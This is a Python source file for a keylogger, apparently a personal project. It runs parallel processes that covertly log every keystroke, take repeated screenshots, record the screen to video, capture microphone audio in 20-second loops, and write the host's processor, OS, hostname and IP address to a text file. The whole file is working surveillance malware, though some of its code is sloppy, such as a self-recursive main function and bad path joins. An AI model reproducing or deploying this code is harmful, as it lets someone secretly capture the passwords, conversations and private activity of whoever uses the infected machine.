from pynput.keyboard import  Key, Listener
import pyautogui
import datetime
import time
import socket
import platform
import numpy as np
from multiprocessing import Process 
from win32api import GetSystemMetrics
import sounddevice
from scipy.io.wavfile import write
import cv2   
import logging

image = "screenshot"
path = "D:\Projects\Keylogger\python"
system_information = "system.txt"
timer = 30
count = 0
keys = []
file = "log.txt"
extend = "\\"



#<===============Logged Keys=================>

def logg_keys(path):
    logging.basicConfig(filename=(path + file),level=logging.DEBUG,format='%(message)s')
    on_press = lambda Key : logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()
    

#<=================Screenshots================>

def screenshot():
    while True:
        now = datetime.datetime.now()
        now_two_params = str(now).split(" ")
        date = str(now_two_params[0])
        raw_time = str(now_two_params[1]).split('.')
        time.raw = str(raw_time[0])
        time_clean = time.raw.replace(":",'')
        for x in range(0,10): 
            try:
                print("Taking a  screenshot....")
                ss = pyautogui.screenshot(path + image + date + "_" + time_clean +".png")
            except Exception as e:
                print(e)
            print("Screenhot taken, parameters of the file are: "+ str(ss))


#<=================Screenrecording================>

def screen_recorder():
    width = GetSystemMetrics(0) # 0 for getting the width
    height = GetSystemMetrics(1) 
    time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
    sc = f'D:\Projects\Keylogger\python\{time_stamp}.mp4'    
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    fps = 150
    captured_video = cv2.VideoWriter(sc,fourcc,fps,(width,height))
    while True:
        for i in range(100):
            try:
                print("Starting screeenreording....")
                img = pyautogui.screenshot()
                frame = np.array(img)
                frame_final = cv2.cvtColor(frame ,  cv2.COLOR_BGR2RGB)
                captured_video.write(frame_final)
            except Exception as e:
                print(e)
    cv2.destroyAllWindows()
    captured_video.release()


#<=================Microphone================>

def microphone():
    while True:
        frme_rate = 44100 # default 48000
        duration = 20
        time_stamp = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
        sr = f'D:\Projects\Keylogger\python\{time_stamp}.wav'
        print("Recording started....")
        recording = sounddevice.rec(int(duration*frme_rate),samplerate=frme_rate,channels=2)
        sounddevice.wait()
        print("Done")
        write(sr, frme_rate, recording)
        
#<=================System_Information================>

def computer_information():
    with open(path + extend+ system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")
        f.write("<==================>")
computer_information()

#<===============Main Function========================>

def main():
   p1 = Process(target=logg_keys,args=(path,)) ; p1.start()
   p2 = Process(target=screenshot); p2.start()
   p3 = Process(target=screen_recorder); p3.start()
   p4 = Process(target=microphone); p4.start()
   p1.join() ; p2.join(); p3.join(); p4.join(); 
   p1.terminate();p2.terminate();p3.terminate(); p4.terminate(); 
   main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
            print('* Control-C entered...Program exiting *')
    








